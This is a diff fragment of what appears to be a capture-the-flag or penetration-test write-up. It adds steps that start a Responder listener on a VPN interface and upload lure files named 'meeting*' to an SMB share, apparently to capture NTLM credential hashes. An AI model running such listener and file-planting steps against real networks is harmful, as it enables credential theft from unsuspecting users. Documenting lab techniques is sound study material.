@@ -276,3 +276,14 @@ First ill generate the files with my IP address inside
 ```python
 sudo responder -I tun0
 ```
+This started a listener
+
+```python
+smb: \Users\Public\> prompt off
+smb: \Users\Public\> mput meeting*
+```
+This planted the files in the share
+
+```python
+
+```
